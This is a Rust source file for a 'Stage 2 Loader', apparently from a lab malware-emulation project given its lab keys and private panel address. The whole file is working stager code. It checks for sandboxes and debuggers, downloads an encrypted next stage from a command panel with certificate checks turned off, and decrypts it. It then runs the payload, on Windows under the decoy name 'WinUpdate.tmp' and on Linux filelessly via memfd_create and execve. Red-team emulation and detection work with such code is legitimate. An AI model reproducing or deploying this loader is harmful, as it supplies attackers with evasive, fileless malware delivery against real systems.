//! Stage 2 Loader
//!
//! Anti-analysis gate that:
//! 1. Checks for VM/sandbox/debugger
//! 2. If clean, fetches and decrypts Stage 3
//! 3. Passes control to Stage 3
//!
//! Detection artifacts:
//! - Anti-analysis API calls (ETW, Sysmon)
//! - HTTP request to staging endpoint
//! - Memory execution

mod constants;
mod crypto;
mod anti_analysis;

use std::process::ExitCode;

/// Embedded configuration (patched by builder)
struct Stage2Config {
    panel_host: &'static str,
    panel_port: u16,
    psk: &'static str,
    salt: &'static [u8],
}

/// Default config for testing
const CONFIG: Stage2Config = Stage2Config {
    panel_host: "10.10.100.1",
    panel_port: 8443,
    psk: "oxide-lab-psk",
    salt: b"oxide-lab-salt-must-be-32-bytes!",
};

fn main() -> ExitCode {
    let test_mode = std::env::args().any(|a| a == "--test");

    if !test_mode {
        if let Err(e) = anti_analysis::check_environment() {
            eprintln!("Environment check failed: {}", e);
            return ExitCode::from(1);
        }
    }

    // Step 2: Fetch encrypted Stage 3
    let stage3_encrypted = match fetch_stage3() {
        Ok(data) => data,
        Err(e) => {
            eprintln!("Failed to fetch Stage 3: {}", e);
            return ExitCode::from(2);
        }
    };

    // Step 3: Decrypt Stage 3
    let stage3_payload = match crypto::decrypt_payload(
        CONFIG.psk,
        CONFIG.salt,
        &stage3_encrypted,
    ) {
        Ok(data) => data,
        Err(e) => {
            eprintln!("Failed to decrypt Stage 3: {}", e);
            return ExitCode::from(3);
        }
    };

    // Step 4: Execute Stage 3 in memory
    if let Err(e) = run_in_memory(&stage3_payload) {
        eprintln!("Failed to run Stage 3: {}", e);
        return ExitCode::from(4);
    }

    ExitCode::SUCCESS
}

/// Fetch encrypted Stage 3 from panel.
fn fetch_stage3() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let url = format!(
        "https://{}:{}/api/staging/3",
        CONFIG.panel_host,
        CONFIG.panel_port
    );

    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    let response = client.get(&url).send()?;
    if !response.status().is_success() {
        return Err(format!("HTTP {}", response.status()).into());
    }

    Ok(response.bytes()?.to_vec())
}

/// Run payload in memory.
fn run_in_memory(payload: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(windows)]
    {
        run_windows(payload)
    }
    #[cfg(unix)]
    {
        run_unix(payload)
    }
}

#[cfg(windows)]
fn run_windows(payload: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    let temp_path = std::env::temp_dir().join("WinUpdate.tmp");
    std::fs::write(&temp_path, payload)?;
    std::process::Command::new(&temp_path).spawn()?;
    Ok(())
}

#[cfg(unix)]
fn run_unix(payload: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    const MFD_CLOEXEC: u32 = 0x0001;
    const SYS_MEMFD_CREATE: i64 = 319; // x86_64

    let name = std::ffi::CString::new("").unwrap();
    let fd: i64;
    unsafe {
        std::arch::asm!(
            "syscall",
            in("rax") SYS_MEMFD_CREATE,
            in("rdi") name.as_ptr(),
            in("rsi") MFD_CLOEXEC,
            lateout("rax") fd,
            out("rcx") _,
            out("r11") _,
        );
    }
    if fd < 0 { return Err(format!("memfd_create failed: {}", fd).into()); }
    let fd = fd as i32;

    extern "C" { fn write(fd: i32, buf: *const u8, count: usize) -> isize; }
    let mut written = 0;
    while written < payload.len() {
        let n = unsafe { write(fd, payload[written..].as_ptr(), payload.len() - written) };
        if n <= 0 { return Err("write failed".into()); }
        written += n as usize;
    }

    let path = format!("/proc/self/fd/{}", fd);
    let c_path = std::ffi::CString::new(path).unwrap();
    let argv: [*const i8; 1] = [std::ptr::null()];
    let envp: [*const i8; 1] = [std::ptr::null()];
    extern "C" { fn execve(path: *const i8, argv: *const *const i8, envp: *const *const i8) -> i32; }
    unsafe { execve(c_path.as_ptr(), argv.as_ptr(), envp.as_ptr()); }
    Err("execve failed".into())
}
